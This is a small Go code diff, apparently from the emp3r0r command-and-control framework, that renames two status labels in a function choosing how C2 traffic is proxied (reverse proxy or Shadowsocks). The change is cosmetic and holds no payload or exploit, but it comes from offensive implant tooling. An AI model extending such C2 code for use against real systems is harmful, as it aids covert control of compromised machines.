@@ -294,11 +294,11 @@ func setC2Transport() {
 
 		// if the proxy port is emp3r0r proxy server's port
 		if proxyURL.Port() == RuntimeConfig.Emp3r0rProxyServerPort && proxyURL.Hostname() == "127.0.0.1" {
-			emp3r0r_data.Transport = fmt.Sprintf("Reverse Proxied: %s", RuntimeConfig.C2TransportProxy)
+			emp3r0r_data.Transport = fmt.Sprintf("Reverse Proxy: %s", RuntimeConfig.C2TransportProxy)
 			return
 		}
 		if proxyURL.Port() == RuntimeConfig.ShadowsocksLocalSocksPort && proxyURL.Hostname() == "127.0.0.1" {
-			emp3r0r_data.Transport = fmt.Sprintf("Auto Proxied: %s", RuntimeConfig.C2TransportProxy)
+			emp3r0r_data.Transport = fmt.Sprintf("Auto Proxy: %s", RuntimeConfig.C2TransportProxy)
 			return
 		}
 
